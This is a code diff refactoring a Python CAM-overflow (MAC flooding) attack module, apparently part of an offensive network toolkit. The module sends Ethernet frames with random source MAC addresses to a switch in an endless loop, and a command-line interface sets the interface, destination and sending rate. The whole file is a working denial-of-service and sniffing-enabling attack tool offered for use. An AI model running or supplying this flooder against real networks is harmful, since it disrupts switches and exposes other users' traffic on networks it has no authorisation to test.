@@ -1,45 +1,54 @@
 import time
-from scapy.all import Ether
-from src.envena.functions import validate_args, rand_eth
+from scapy.all import Ether, hexdump, conf
+from src.envena.functions import rand_eth
 from random import uniform
-cam_overflow_v = 1.1
+from src.envena.base.arguments import Arguments
+from src.envena.base.tool import Tool
+from src.modules.ethernet.ether import EtherPacket, EtherPacketType
 
-def cam_overflow(args: dict)->None:
-    if not validate_args(iface=args['iface']):
-        return False
-    iface = args['iface']
-    input = args['input']
-    eth_dst = args['eth_dst']
-    speed = args['timeout']
+
+def cam_overflow(param, logger)->None:
+    param.timeout = 0.002 if not param.timeout else param.timeout
     sent_packets = 0
-    input = 'X'*64 if not input else input
+    param.iface = conf.iface if not param.iface else param.iface
+    param.input = 'X'*64 if not param.input else param.input
     
-    print(f'CAM-overflow attack module, version {cam_overflow_v}')
     try:
-        print('*CAM-overflow attack started. Ctrl+C to stop')
         eth_src=rand_eth()
-        scapy.hexdump(Ether(src=eth_src, dst=eth_dst if eth_dst else rand_eth()) / (input))
+        hexdump(Ether(src=rand_eth(), dst=str(param.eth_dst).replace('-',':') if param.eth_dst else rand_eth()) / (param.input))
         while True:
             try:
-                eth_src=rand_eth()
-                scapy.sendp(Ether(src=eth_src, dst=eth_dst if eth_dst else rand_eth()) / (input), verbose=False, iface=iface)
-                print(f"\r{sent_packets}. Sent ethernet frame from MAC: {eth_src}", end='')
+                # eth_src=rand_eth()
+                # sendp(Ether(src=eth_src, dst=param.eth_dst if param.eth_dst else rand_eth()) / (param.input), verbose=False, iface=param.iface)
+                eth_src = rand_eth()
+                EtherPacket(iface=param.iface, count=1, timeout=0, eth_src=eth_src, eth_dst=\
+                param.eth_dst if param.eth_dst else rand_eth(), packet_type=EtherPacketType.Ether, payload=\
+                param.input if param.input else 'X'*64).send_packet(printed=False)
+                logger.info(f"{sent_packets}... Sent ethernet frame from MAC: {eth_src}")
                 sent_packets += 1
             except Exception as e:
-                print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
-            time.sleep(round(uniform(0, speed), 3)) # 1 packet on 0,002 sec is optimal
+                logger.error(f"Packet was not sent: {e}")
+            time.sleep(round(uniform(0, param.timeout), 3)) # 1 packet on 0,002 sec is optimal
     except KeyboardInterrupt:
-        print(f"\n\r{Success}{sent_packets} packet(s) sent.{Clear}")
-        print('\nAborted.')
+        logger.info(f"{sent_packets} packet(s) sent")
 
 if __name__ == '__main__':
     import argparse
-    parser = argparse.ArgumentParser(description=f"CAM-overflow attack module. Verison: {cam_overflow_v}")
-    parser.add_argument("-i", "--iface", help="Network iface send from.", required=False)
-    parser.add_argument("-ed", "--eth_dst", help="Destination MAC-address.", required=False)
-    parser.add_argument("-p", "--input", help="Payload content. The default is 'X' in 64 times.", required=False)
-    parser.add_argument("-t", "--timeout", help="Speed of sending MAC-addresses. The default is 500 MAC/sec.", required=False, type=int)
-    
+    parser = argparse.ArgumentParser(description=f"CAM-overflow attack module")
+    parser.add_argument("-i", "--iface", help="network iface send from", required=False, default=str(conf.iface))
+    parser.add_argument("-ed", "--eth_dst", help="destination MAC-address", required=False, default=rand_eth())
+    parser.add_argument("-in", "--input", help="payload content. The default is 'X' in 64 times", required=False, default='X'*64)
+    parser.add_argument("-t", "--timeout", help="timeout between of sending packets. The default is 500 MAC/sec", required=False, type=float, 
+                        default=0.002)
 
-    arg = parser.parse_args()
-    cam_overflow(speed=arg.speed, input=arg.input, iface=arg.iface, eth_dst=arg.eth_dst)
+    cli_args = parser.parse_args()
+    
+    args = Arguments()
+    
+    args.timeout = cli_args.timeout
+    args.eth_dst = cli_args.eth_dst
+    args.iface = cli_args.iface
+    
+    t_cam_overflow = Tool(tool_func=cam_overflow, VERSION=1.1, args=args)
+    
+    t_cam_overflow.start_tool()
